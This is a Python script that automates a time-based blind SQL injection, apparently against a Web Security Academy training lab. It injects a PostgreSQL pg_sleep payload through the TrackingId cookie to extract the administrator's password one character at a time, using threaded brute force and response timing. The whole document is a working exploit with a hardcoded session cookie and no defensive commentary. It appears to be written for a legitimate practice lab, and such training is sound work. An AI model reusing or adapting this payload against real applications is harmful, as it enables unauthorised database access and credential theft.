import threading
import requests
import urllib3
import random
import string
import queue
import sys

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

alphabet = list(string.ascii_lowercase)
numbers = list(range(0, 21))
threads = 1 

def split(word):
    return list(word)

def load_payloads():
    while True:
        numbers = queue_positions.get()        
        send_request(numbers[1], numbers[0])
        queue_positions.task_done()

def send_request(word, number):
    try:
        headers = {
                "Cookie": "TrackingId=x'%3BSELECT CASE WHEN (username='administrator' AND substring(password,{position},1)='{words}') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--" ";session=bkoGNTazK2CZRN0ufwxjQHXUb2li5Ey6".format(words=word,position=number)
        }
        request = requests.get(
                'https://.web-security-academy.net',
                verify=True,
                headers=headers
                )
        if request.elapsed.total_seconds() > 9.0:
            print('[+] Success {position}:{words}'.format(words=word,position=number))
        else:
#            print('[-] Not found time: {time} - {position}:{words}'.format(words=word,position=number,time=request.elapsed.total_seconds()))
            pass
    except Exception as err:
        print("[-] Exception: - ", err)
            
queue_positions = queue.Queue(threads * 2)

for i in range(threads):
    t = threading.Thread(target=load_payloads)
    t.start()

try:
    for number in split(numbers):
        for words in split(alphabet+numbers):
            queue_positions.put((number, words))
    queue_positions.join()

except KeyboardInterrupt:
    sys.exit(1)
